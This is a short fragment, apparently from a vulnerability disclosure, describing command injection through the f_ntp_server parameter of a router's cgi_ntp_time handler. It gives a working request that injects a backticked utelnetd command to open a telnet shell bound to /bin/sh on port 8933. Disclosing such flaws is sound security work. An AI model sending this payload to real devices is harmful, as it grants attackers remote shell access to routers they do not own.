...
In `cgi_ntp_time` function, `f_ntp_server` is directly passed by the attacker, so we can control the `f_ntp_server` to attack the OS.
...
We set `f_ntp_server` as **`utelnetd -p 8933 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=cgi_ntp_time&f_ntp_server=`utelnetd -p 8933 -l /bin/sh`
```
